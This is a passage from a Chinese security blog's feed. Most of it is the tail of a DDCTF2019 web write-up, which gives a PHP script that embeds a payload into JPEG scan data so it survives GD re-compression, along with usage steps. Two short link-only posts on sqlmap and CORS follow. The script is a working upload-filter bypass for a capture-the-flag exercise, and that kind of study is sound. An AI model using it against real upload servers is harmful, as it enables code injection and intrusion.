class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>使用方法</strong></li></ul><p>1). 随便找一个jpg图片,<code>先上传至服务器然后再下载到本地保存为1.jpg</code><br>2). 使用脚本处理1.jpg,命令<code>php jpg_payload.php 1.jpg</code></p><blockquote><p>亲测有效，不愧是大佬，稳了一P。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-dc7fa57a91bd8172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>参考</li></ul><p><a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><hr><p><em>&lt;完&gt;太菜了，只能玩到这了，写的不好别喷，坐等其他Writeup</em></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文主要记录&lt;code&gt;DDCTF2019&lt;/code&gt;中部分web赛题的解题过程，仅学习参考使用。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://zzqsmile.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://zzqsmile.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用指南</title>
    <link href="http://zzqsmile.top/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/"/>
    <id>http://zzqsmile.top/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/</id>
    <published>2019-04-06T01:00:00.000Z</published>
    <updated>2019-04-06T13:27:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文旨在记录sqlmap使用方法</p></blockquote><a id="more"></a><ul><li><strong>sqlmap脑图</strong></li></ul><p><a href="https://github.com/bugku/Mind-Map/blob/master/SQLmap%E8%84%91%E5%9B%BE.jpg">https://github.com/bugku/Mind-Map/blob/master/SQLmap%E8%84%91%E5%9B%BE.jpg</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文旨在记录sqlmap使用方法&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="tools" scheme="http://zzqsmile.top/categories/tools/"/>
    
    
    <category term="sqlmap" scheme="http://zzqsmile.top/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>跨域资源共享CORS</title>
    <link href="http://zzqsmile.top/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/"/>
    <id>http://zzqsmile.top/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/</id>
    <published>2019-04-04T01:00:00.000Z</published>
    <updated>2019-04-04T07:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细</strong></p><a id="more"></a><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
</feed>
